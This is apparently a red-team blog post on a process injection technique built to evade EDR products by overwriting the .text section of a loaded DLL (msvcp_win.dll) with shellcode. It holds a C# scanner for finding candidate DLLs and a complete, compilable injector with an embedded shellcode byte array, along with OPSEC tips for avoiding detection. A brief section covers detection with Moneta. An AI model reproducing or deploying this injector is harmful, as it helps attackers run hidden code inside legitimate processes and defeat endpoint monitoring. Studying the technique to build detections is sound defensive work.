# https://www.netero1010-securitylab.com/evasion/alternative-process-injection

## [hashtag](https://www.netero1010-securitylab.com/evasion/alternative-process-injection\#introduction)    Introduction

Process injection is a well-known defense evasion technique that has been used for decades to execute malicious code in a legitimate process. Until now, it is still a common technique used by hackers/red teamers.

From the attacker's perspective, signature-based detection from Anti Virus is no longer the main challenge for defense evasion. Instead, Endpoint Detection and Response (EDR) solutions become their pain point because of its various types of telemetry sources available to identify process injection attacks, using the following ways:

- Kernel callbacks (e.g., PsSetCreateProcessNotifyRoutine)

- ETW (Event Tracing for Windows) Threat Intelligence

- Sysmon like events

- API hooking and monitoring


With these challenges, security researchers developed different evasion techniques (e.g., DInvoke, Syscall, API unhooking). However, those user-mode evasion techniques are still insufficient to bypass some of the EDR solutions especially when they have data sources on the kernel level such as ETW TI.

To have a deeper understanding, I built a custom ETW TI agent to study what data is collected. Then, I learned that it could provide incredible visibility for EDR vendors to monitor commonly abused API calls (e.g., SetThreaContext, memory allocation APIs) and create detection rules similar to [Get-InjectedThreadarrow-up-right](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2).

Particularly, **CreateRemoteThread** is one of the most popular techniques and it usually comes with the following API call sequence:

1. **VirtualAllocEx**-\> allocate memory space to stage the shellcode

2. **WriteProcessMemory**-\> write the decrypted/decoded shellcode in the memory space

3. **CreateRemoteThread**-\> create a new thread on the process with the start address pointing to the memory space


Since this good old technique has been abused for years, it is not surprising to see EDR products detecting it. Therefore, I started looking for alternative techniques that use less suspicious API calls and parameters to minimize footprint and abnormality (e.g., starting a thread on a private memory page), I then found [XPNarrow-up-right](https://twitter.com/_xpn_)'s [Understanding and Evading Get-InjectedThreadarrow-up-right](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/) discussed different ways to bypass the detection of Get-InjectedThread.

Since the memory page allocated using NtAllocateVirtualMemory/VirtualAllocEx is always assigned to a private type (i.e., **MEM\_PRIVATE**)unlike **MEM\_IMAGE** for images (EXE/DLL) **,** this becomes a strong Indicators of Compromise (IOC) for Get-InjectedThread to detect **CreateRemoteThread** injection attack when the start address of a thread is on a **MEM\_PRIVATE** memory page.

In XPN's blog post, he provided several ways to bypass the detection, including:

- Inject DLL via LoadLibrary

- CreateRemoteThread + SetThreadContext

- Leverage the instructions of an existing **MEM\_IMAGE** binary to pass execution to shellcode


**So this post would like to discuss an alternative injection by injecting the shellcode into the already loaded DLL memory page.**

## [hashtag](https://www.netero1010-securitylab.com/evasion/alternative-process-injection\#advantages-of-the-technique)    **Advantages of the technique**

Before we walk through the implementation, let's talk about the advantages of this technique in terms of detection evasion:

- No memory allocation APIs are used (e.g., **NtAllocateVirtualMemory**, **VirtualAllocEx**, **NtMapViewOfSection**)

- Thread is executed within .text section of a DLL which makes more sense to have execution right (i.e., **PAGE\_EXECUTE\_READ**) on the memory page

- Start address of the newly created thread is located in **MEM\_IMAGE** memory region without using the traditional thread hijacking technique (heavily monitored!)


## [hashtag](https://www.netero1010-securitylab.com/evasion/alternative-process-injection\#walkthrough)    Walkthrough

The main problem with this technique is that most of the time the process will crash when the shellcode is overwritten to an existing DLL memory page because the memory page has been used by the process to make it work.

To find a good memory page candidate for shellcode injection, I defined the following requirements:

- The memory page should belong to a .text section since it has executionright (i.e., **PAGE\_EXECUTE\_READ**) on the memory page by nature

- The memory page should provide sufficient space to store the shellcode

- Overwriting the bytes in the memory page should not crash the process

- The DLL candidate should be commonly loaded by different processes


To find a suitable candidate, I made a dirty C# script that will inject shellcode into the .text section of each DLL module loaded by the target process (e.g., notepad.exe) and return the result if the injection did not crash the process.

Copy

```
static void Main(string[] args)
{
    string targetProcess = @"c:\Windows\System32\notepad.exe";
    byte[] buf = new byte[] { //Sample MsgBox shellcode// };
    STARTUPINFO si = new STARTUPINFO();
    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    bool success = CreateProcess(targetProcess, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
    Process processObj = Process.GetProcessById((int)pi.dwProcessId);
    Thread.Sleep(2000); // Sleep to make sure all modules have been loaded by the process
    Console.WriteLine("Total modules to be scanned: " + processObj.Modules.Count);
    processObj.Kill();
    Dictionary<string, bool> testDll = new Dictionary<string, bool>();
    while (testDll.Count < processObj.Modules.Count) {
        si = new STARTUPINFO();
        pi = new PROCESS_INFORMATION();
        CreateProcess(targetProcess, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
        processObj = Process.GetProcessById((int)pi.dwProcessId);
        Thread.Sleep(2000); // Sleep to make sure all modules have been loaded by the process
        foreach (ProcessModule module in processObj.Modules) {
            if (!testDll.ContainsKey(module.FileName)) {
                IntPtr addr = (module.BaseAddress + 4096); // Get address of .text section
                IntPtr outSize;
                uint oldProtect;
                VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x04, out oldProtect);
                WriteProcessMemory(processObj.Handle, addr, buf, buf.Length, out outSize);
                VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x20, out oldProtect);
                IntPtr hThread = CreateRemoteThread(processObj.Handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x0, out hThread);
                Thread.Sleep(10000);
                if (!Process.GetProcesses().Any(x => x.Id == pi.dwProcessId)) {
                    testDll.Add(module.FileName, false);
                    break;
                } else {
                    MEMORY_BASIC_INFORMATION64 mem_basic_info = new MEMORY_BASIC_INFORMATION64();
                    VirtualQueryEx(pi.hProcess, addr, out mem_basic_info, (uint)Marshal.SizeOf(mem_basic_info));
                    Console.WriteLine("Found valid candidate: " + module.FileName + ", region size available on the .text section: " + mem_basic_info.RegionSize);
                    testDll.Add(module.FileName, true);
                    processObj.Kill();
                    break;
                }
            }
        }
    }
}
```

circle-info

Since this study aims to improve my C# tradecraft to bypass EDR solutions so all demonstrations will be using C# code.

After executing the above scanning script, several potential candidates show up and **msvcp\_win.dll** is selected for demonstration purposes based on the fact that this DLL is commonly loaded by different processes (e.g., notepad.exe, explorer.exe, iexplore.exe) and the region size of its .text section is sufficient to store common shellcode (staged/stageless).

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FKP7rIHVgiZB3c3n4Qap3%252Fimage.png%3Falt%3Dmedia%26token%3Da6374420-2bc1-4ea1-8e65-f326ef2a7f41&width=768&dpr=3&quality=100&sign=8ee85563&sv=2)

circle-info

When you pick your DLL candidate, you should think about whether that DLL will be used by your shellcode too.

The following code is used to locate the base address of the **msvcp\_win.dll** and increase 0x1000 bytes to get the .text start address.

Copy

```
Process processObj = Process.GetProcessById(pid);
foreach (ProcessModule module in processObj.Modules)
{
    if (module.FileName.ToLower().Contains("msvcp_win.dll"))
    {
        IntPtr addr = module.BaseAddress + 4096; // Point to .text section
        //Write and inject
    }
}
```

Once the address of the .text section was found, the memory protection flag will be changed from **RX** to **RW** using **VirtualProtectEx** to allow copying the shellcode into the memory page.

Copy

```
uint oldProtect = 0;
VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x04, out oldProtect);
```

Then, **WriteProcessMemory** is used to copy the shellcode and **VirtualProtectEx** again will be used to restore the memory protection flag from **RW** back to **RX**. In the end, a new thread will be created using **CreateRemoteThread**.

Copy

```
WriteProcessMemory(processObj.Handle, addr, buf, buf.Length, out outSize);
VirtualProtectEx(processObj.Handle, addr, (UIntPtr)16, 0x20, out oldProtect);
IntPtr hThread = CreateRemoteThread(processObj.Handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x0, out hThread);
```

circle-info

Since **WriteProcessMemory** API has a feature allowing writing data to a read-only memory page by re-protecting it to a writeable memory page using **NtProtectVirtualMemory**, it could be unnecessary to change the protection flag manually using **VirtualProtectEx**. (Thanks for the reminder from [@kyREconarrow-up-right](https://twitter.com/kyREcon))

However, this feature will temporarily set the protection flag of the memory page to **RWX/WCX**, which could be an IOC for suspicious activity. Therefore, updating the protection flag manuallyusing **VirtualProtectEx**( **RX->RW->RX**)could be an OPSEC consideration to avoid this happening.

By combining the above all together, below is the final code:

Copy

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace AnotherDLLHollowing
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static void Main(string[] args)
        {
            int pid = Process.GetProcessesByName("notepad")[0].Id;
            byte[] buf = new byte[] { 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20, 0xe8, 0x7f, 0x01, 0x00, 0x00, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x41, 0x89, 0xca, 0x4c, 0x8b, 0x58, 0x20, 0x4d, 0x89, 0xd9, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x49, 0x50, 0x48, 0x85, 0xc9, 0x74, 0x63, 0x0f, 0xb7, 0x01, 0x66, 0x85, 0xc0, 0x74, 0x5f, 0x48, 0x89, 0xca, 0x0f, 0x1f, 0x40, 0x00, 0x44, 0x8d, 0x40, 0xbf, 0x66, 0x41, 0x83, 0xf8, 0x19, 0x77, 0x06, 0x83, 0xc0, 0x20, 0x66, 0x89, 0x02, 0x0f, 0xb7, 0x42, 0x02, 0x48, 0x83, 0xc2, 0x02, 0x66, 0x85, 0xc0, 0x75, 0xe2, 0x0f, 0xb7, 0x01, 0x66, 0x85, 0xc0, 0x74, 0x32, 0x41, 0xb8, 0x05, 0x15, 0x00, 0x00, 0x0f, 0x1f, 0x40, 0x00, 0x44, 0x89, 0xc2, 0x48, 0x83, 0xc1, 0x02, 0xc1, 0xe2, 0x05, 0x01, 0xd0, 0x41, 0x01, 0xc0, 0x0f, 0xb7, 0x01, 0x66, 0x85, 0xc0, 0x75, 0xe9, 0x45, 0x39, 0xc2, 0x74, 0x17, 0x4d, 0x8b, 0x09, 0x4d, 0x39, 0xcb, 0x75, 0x94, 0x31, 0xc0, 0xc3, 0x90, 0x41, 0xb8, 0x05, 0x15, 0x00, 0x00, 0x45, 0x39, 0xc2, 0x75, 0xe9, 0x49, 0x8b, 0x41, 0x20, 0xc3, 0x41, 0x54, 0x41, 0x89, 0xd4, 0x53, 0x89, 0xcb, 0x48, 0x83, 0xec, 0x38, 0xe8, 0x4f, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x22, 0xb9, 0x75, 0xee, 0x40, 0x70, 0xe8, 0x40, 0xff, 0xff, 0xff, 0x48, 0x89, 0xc1, 0x48, 0x85, 0xc0, 0x75, 0x28, 0x48, 0x83, 0xc4, 0x38, 0x31, 0xc0, 0x5b, 0x41, 0x5c, 0xc3, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x48, 0x83, 0xc4, 0x38, 0x44, 0x89, 0xe2, 0x5b, 0x41, 0x5c, 0xe9, 0xe6, 0x00, 0x00, 0x00, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0xba, 0xfb, 0xf0, 0xbf, 0x5f, 0xe8, 0xd6, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0xc9, 0x81, 0xfb, 0xf3, 0xd3, 0x6b, 0x5a, 0x74, 0x31, 0x81, 0xfb, 0x6d, 0x9c, 0xbd, 0x8d, 0x75, 0xb9, 0x48, 0xbb, 0x57, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x2e, 0x48, 0x8d, 0x4c, 0x24, 0x24, 0xc7, 0x44, 0x24, 0x2c, 0x64, 0x6c, 0x6c, 0x00, 0x48, 0x89, 0x5c, 0x24, 0x24, 0xff, 0xd0, 0x48, 0x89, 0xc1, 0xeb, 0x2e, 0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00, 0xba, 0x6c, 0x6c, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x24, 0xc6, 0x44, 0x24, 0x2e, 0x00, 0x48, 0xbb, 0x55, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x48, 0x89, 0x5c, 0x24, 0x24, 0x66, 0x89, 0x54, 0x24, 0x2c, 0xff, 0xd0, 0x48, 0x89, 0xc1, 0x48, 0x85, 0xc9, 0x0f, 0x85, 0x72, 0xff, 0xff, 0xff, 0xe9, 0x5a, 0xff, 0xff, 0xff, 0x90, 0x90, 0x48, 0x83, 0xec, 0x38, 0xba, 0xb4, 0x14, 0x4f, 0x38, 0xb9, 0xf3, 0xd3, 0x6b, 0x5a, 0xe8, 0x1d, 0xff, 0xff, 0xff, 0x45, 0x31, 0xc0, 0x48, 0x85, 0xc0, 0x74, 0x36, 0xba, 0x31, 0x30, 0x00, 0x00, 0xc6, 0x44, 0x24, 0x2f, 0x00, 0x48, 0xb9, 0x6e, 0x65, 0x74, 0x65, 0x72, 0x6f, 0x31, 0x30, 0x41, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x66, 0x89, 0x54, 0x24, 0x2d, 0x48, 0x8d, 0x54, 0x24, 0x25, 0x48, 0x89, 0x4c, 0x24, 0x25, 0x49, 0x89, 0xd0, 0x31, 0xc9, 0xff, 0xd0, 0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0xc0, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x56, 0x53, 0x48, 0x63, 0x41, 0x3c, 0x8b, 0xbc, 0x01, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xcf, 0x44, 0x8b, 0x4f, 0x20, 0x8b, 0x5f, 0x18, 0x49, 0x01, 0xc9, 0x85, 0xdb, 0x74, 0x59, 0x49, 0x89, 0xcb, 0x89, 0xd6, 0x45, 0x31, 0xd2, 0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x01, 0xb9, 0x05, 0x15, 0x00, 0x00, 0x4c, 0x01, 0xd8, 0x4c, 0x8d, 0x40, 0x01, 0x0f, 0xb6, 0x00, 0x84, 0xc0, 0x74, 0x21, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x89, 0xca, 0xc1, 0xe2, 0x05, 0x01, 0xd0, 0x01, 0xc1, 0x4c, 0x89, 0xc0, 0x49, 0x83, 0xc0, 0x01, 0x0f, 0xb6, 0x00, 0x84, 0xc0, 0x75, 0xe9, 0x39, 0xce, 0x74, 0x13, 0x49, 0x83, 0xc2, 0x01, 0x49, 0x83, 0xc1, 0x04, 0x4c, 0x39, 0xd3, 0x75, 0xb8, 0x5b, 0x31, 0xc0, 0x5e, 0x5f, 0xc3, 0x8b, 0x57, 0x24, 0x4b, 0x8d, 0x0c, 0x53, 0x8b, 0x47, 0x1c, 0x5b, 0x5e, 0x0f, 0xb7, 0x14, 0x11, 0x5f, 0x49, 0x8d, 0x14, 0x93, 0x8b, 0x04, 0x02, 0x4c, 0x01, 0xd8, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            Process processObj = Process.GetProcessById(pid);
            foreach (ProcessModule module in processObj.Modules)
            {
                if (module.FileName.ToLower().Contains("msvcp_win.dll"))
                {
                    IntPtr addr = module.BaseAddress + 4096;
                    IntPtr outSize;
                    uint oldProtect;
                    VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x04, out oldProtect);
                    WriteProcessMemory(processObj.Handle, addr, buf, buf.Length, out outSize);
                    VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x20, out oldProtect);
                    IntPtr hThread = CreateRemoteThread(processObj.Handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x0, out hThread);
                    break;
                }
            }
        }
    }
}
```

Once the above code is compiled and executed, you should be able to get your shellcode executed as below:

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FTxZVHz7rCod7n7mfoNWx%252Fimage.png%3Falt%3Dmedia%26token%3D66350d5d-07db-4c87-8a64-ca384b27f087&width=768&dpr=3&quality=100&sign=496376cd&sv=2)

By using this technique, a new thread is created from a start address of an existing loaded DLL instead of a private memory page.

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FbbFVnkmHuBmLaBMlTlDX%252Fimage.png%3Falt%3Dmedia%26token%3D64f815ff-6ac4-4617-ac91-0e8ced8563a1&width=768&dpr=3&quality=100&sign=b5475f4a&sv=2)

## [hashtag](https://www.netero1010-securitylab.com/evasion/alternative-process-injection\#detection)    Detection

This technique could bypass different common IOCs such as abnormal private executable memory and thread within non-image memory regions.

However, using [Monetaarrow-up-right](https://github.com/forrest-orr/moneta), you will see it could be detected by an IOC regarding "Modified code".

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FhfShY6aMdKsiUEqQvhHI%252Fimage.png%3Falt%3Dmedia%26token%3D287f6a4b-85da-4599-8510-4d9abca39231&width=768&dpr=3&quality=100&sign=5fc4c84&sv=2)

As mentioned by Forrest Orr's " [Masking Malicious Memory Artifacts – Part II: Blending in with False Positivesarrow-up-right](https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta)", once we modified the original memory page of an existing DLL, 0x1000 bytes of memory of data in .text section will be marked as private. This nature becomes an IOC to detect modified code in legitimate DLL.

![](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2F3629422832-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fhc07wjSjeLaJUxQVJfIF%252Fuploads%252FZ6LFhYbKiJLoXD9UCM5z%252Fimage.png%3Falt%3Dmedia%26token%3Dc901bfc3-5e0c-44a4-b319-454c18333b4d&width=768&dpr=3&quality=100&sign=f4655610&sv=2)

## [hashtag](https://www.netero1010-securitylab.com/evasion/alternative-process-injection\#final-word)    Final Word

While writing this page, I found there is an existing technique called " **DLL Hollowing**" that will create an image section to the process and replace the memory space with the shellcode. From my perspective, each has its advantages.

By comparing with different types of " **DLL Hollowing**", this technique has the following advantages:

- Not required to load any new legitimate library

- Avoid IOC for missing PEB module since the newly loaded library is not called using LdrLoadDll


However, the key disadvantage is that:

- it is not as stable as other injection techniques because the target process most likely will be unusable after injection. You should avoid using this technique against any existing running process (e.g., injecting a keylogger to explorer.exe).


**Reference**:

[![Logo](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fstatic.parastorage.com%2Fclient%2Fpfavico.ico&width=20&dpr=3&quality=100&sign=fadbd121&sv=2)Masking Malicious Memory Artifacts – Part I: Phantom DLL HollowingForrestOrrchevron-right](https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing)

[![Logo](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fstatic.parastorage.com%2Fclient%2Fpfavico.ico&width=20&dpr=3&quality=100&sign=fadbd121&sv=2)Masking Malicious Memory Artifacts – Part II: Blending in with False PositivesForrestOrrchevron-right](https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta)

[![Logo](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fblog.xpnsec.com%2Fimages%2Ffavicon.ico&width=20&dpr=3&quality=100&sign=73b93ce0&sv=2)@\_xpn\_ - Understanding and Evading Get-InjectedThreadXPN InfoSec Blogchevron-right](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread)

[![Logo](https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&width=20&dpr=3&quality=100&sign=da1c54e&sv=2)GitHub - forrest-orr/moneta: Moneta is a live usermode memory analysis tool for Windows with the capability to detect malware IOCsGitHubchevron-right](https://github.com/forrest-orr/moneta)

[PreviousIndirect Syscall in CSharpchevron-left](https://www.netero1010-securitylab.com/evasion/indirect-syscall-in-csharp) [NextExecution of Remote VBA Script in Excelchevron-right](https://www.netero1010-securitylab.com/evasion/execution-of-remote-vba-script-in-excel)

Last updated 2 years ago